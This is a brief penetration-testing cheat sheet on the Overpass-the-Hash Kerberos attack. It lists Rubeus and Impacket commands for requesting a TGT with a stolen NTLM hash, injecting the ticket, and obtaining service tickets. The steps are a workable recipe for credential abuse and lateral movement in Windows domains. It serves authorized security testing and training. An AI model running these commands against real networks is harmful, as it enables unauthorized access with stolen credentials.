**Pentest Note: Overpass the Hash (PtH)**

---

### Step 1: Obtain a TGT (Ticket Granting Ticket)

Use the hash to get a TGT. This ticket allows you to request service tickets (TGS) for accessing various services.

### Step 2: Request a TGS (Ticket Granting Service)

With the TGT, you can request a TGS for a specific service.

### Tools and Commands:

#### Windows:

**Using Rubeus:**

1. **Request TGT:**

   ```powershell
   # Request a TGT using Rubeus
   Rubeus.exe asktgt /user:<user> /rc4:<hash> /domain:<domain> /dc:<dc_ip>
   ```

2. **Pass the Ticket:**

   ```powershell
   # Pass the TGT using Rubeus
   Rubeus.exe ptt /ticket:<ticket>
   ```

3. **Create NetOnly Session:**

   ```powershell
   # Create a NetOnly session using Rubeus
   Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
   ```

4. **Pass the Ticket with LUID:**

   ```powershell
   # Pass the ticket with LUID using Rubeus
   Rubeus.exe ptt /luid:0xdeadbeef /ticket:<ticket>
   ```

#### Kali Linux:

**Using Impacket:**

1. **Request TGT and TGS:**

   ```bash
   # Request a TGT
   getTGT.py <domain>/<user> -hashes :<hashes> -dc-ip <dc_ip>

   # Request a TGS for a specific service
   getST.py -k -no-pass -spn <service>/<hostne> <domain>/<user>
   ```

### Summary:

By obtaining a TGT using the hash and requesting a TGS for specific services, you can access various network resources. The tools and commands listed above are essential for performing Overpass-the-Hash attacks and leveraging Kerberos tickets during penetration tests. Always ensure your activities are authorized and comply with legal and ethical guidelines.